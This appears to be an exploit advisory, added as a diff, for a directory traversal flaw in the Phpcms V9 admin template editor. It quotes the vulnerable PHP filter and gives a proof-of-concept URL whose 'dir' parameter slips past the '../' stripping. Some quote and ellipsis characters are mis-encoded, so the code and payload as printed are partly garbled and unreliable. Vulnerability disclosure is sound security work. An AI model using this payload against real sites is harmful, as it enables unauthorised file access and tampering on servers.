@@ -1,0 +1,32 @@
+# Exploit Title: Phpcms V9 admin template edit directory traversal Vulnerability
+# Date: 2012-5-10
+# Author: flyh4t
+# Software Link: http://www.phpcms.cn
+# Version: PHPCMS V9
+# Tested on: linux+apache
+
+
+Phpcms is a widely used cms in China ,see it at www.phpcms.cn
+Here is the vul code: 
+
+-----------------------vul code-------------------
+public function edit_file() {
+ if (empty($this->tpl_edit)) {
+ showmessage(L(¡®tpl_edit¡¯));
+ }
+ $dir = isset($_GET['dir']) && trim($_GET['dir']) ? str_replace(array(¡®..\\¡¯, ¡®../¡¯, ¡®./¡¯, ¡®.\\¡¯), ¡±, urldecode(trim($_GET['dir']))) : ¡±;
+ $file = isset($_GET['file']) && trim($_GET['file']) ? trim($_GET['file']) : ¡±;
+ if ($file) {
+ 
+¡­¡­
+-----------------------vul code end----------------
+
+ 
+we can user by the filter like this: dir=wap/¡­././/¡­././/¡­././/¡­././/
+
+------------------------POC----------------
+
+index.php?m=template&c=file&a=edit_file&style=default&dir=wap/¡­././/¡­././/¡­././/¡­././/&file=index.html&pc_hash=YHgoqn
+
+------------------------POC----------------
+
